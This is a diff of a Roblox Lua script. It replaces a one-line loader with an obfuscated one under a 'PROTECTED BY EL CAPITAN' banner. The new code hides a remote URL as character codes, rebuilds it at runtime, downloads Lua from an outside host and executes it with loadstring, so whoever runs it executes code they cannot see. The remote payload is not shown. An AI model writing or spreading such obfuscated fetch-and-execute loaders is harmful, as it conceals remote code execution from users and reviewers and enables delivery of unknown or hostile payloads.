@@ -1,1 +1,42 @@
-loadstring(game:HttpGet("https://api.xhider.xyz/files/v4/loaders/685dfdbc7c504a7972da144e8cfe65de.lua"))()
+--[[
+    PROTECTED BY EL CAPITAN
+    CAPITAN SECURITY
+]]
+
+local _0 = string.char
+local _1 = table.concat
+local _2 = {
+    104,116,116,112,115,58,47,47,
+    97,112,105,46,120,104,105,100,101,114,
+    46,120,121,122,47,102,105,108,101,115,
+    47,118,52,47,108,111,97,100,101,114,115,
+    47,54,56,53,100,102,100,98,99,55,99,53,
+    48,52,97,55,57,55,50,100,97,49,52,52,
+    101,56,99,102,101,54,53,100,101,46,108,117,97
+}
+
+local function _3(t)
+    local r = {}
+    for i = 1, #t do
+        r[i] = _0(t[i])
+    end
+    return _1(r)
+end
+
+local function _4()
+    local u = _3(_2)
+    local s = game:HttpGet(u)
+    local f, e = loadstring(s)
+
+    if not f then
+        error(e)
+    end
+
+    return f()
+end
+
+local _5, _6 = pcall(_4)
+
+if not _5 then
+    warn("[EL CAPITAN SECURITY] " .. tostring(_6))
+end
